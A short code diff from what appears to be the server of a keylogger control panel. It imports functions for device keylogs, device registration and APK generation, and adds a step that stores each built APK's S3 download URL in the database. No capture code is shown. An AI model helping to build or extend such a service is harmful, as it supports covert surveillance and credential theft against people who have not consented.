@@ -8,7 +8,7 @@ import { getSessionCookieOptions } from "./_core/cookies";
 import { COOKIE_NAME } from "../shared/const";
 import { systemRouter } from "./_core/systemRouter";
 import { publicProcedure, protectedProcedure, router } from "./_core/trpc";
-import { getKeylogsByDevice, deleteKeylog, restoreKeylog, getAlerts, getEvents, saveSettings, getSettings, getDeletedKeylogs, registerDevice, getDevicesByUser, createAPKBuild, getAPKBuildsByUser, updateAPKBuildStatus, updateAPKBuildFileSize, updateAPKBuildGitHubUrl, deleteAllAPKBuildsByUser, getAPKBuildByFilename } from './db';
+import { getKeylogsByDevice, deleteKeylog, restoreKeylog, getAlerts, getEvents, saveSettings, getSettings, getDeletedKeylogs, registerDevice, getDevicesByUser, createAPKBuild, getAPKBuildsByUser, updateAPKBuildStatus, updateAPKBuildFileSize, updateAPKBuildGitHubUrl, updateAPKBuildDownloadUrl, deleteAllAPKBuildsByUser, getAPKBuildByFilename } from './db';
 import { sdk } from "./_core/sdk";
 import { generateRealAPK } from "./apk-generator-real";
 import { uploadToGitHubRelease, generateReleaseName, generateReleaseTag, generateReleaseBody } from "./github-releases";
@@ -341,6 +341,8 @@ export const appRouter = router({
                 const s3Result = await storagePut(`apks/${filename}`, apkBuffer, 'application/vnd.android.package-archive');
                 downloadUrl = s3Result.url; // Usar URL do S3
                 console.log('[APK] Upload para S3 concluído! URL:', downloadUrl);
+                // Atualizar downloadUrl no banco de dados
+                await updateAPKBuildDownloadUrl(build.id, downloadUrl);
               } catch (error) {
                 console.warn('[APK] Aviso ao fazer upload para S3:', error);
                 // Continuar com URL local se S3 falhar
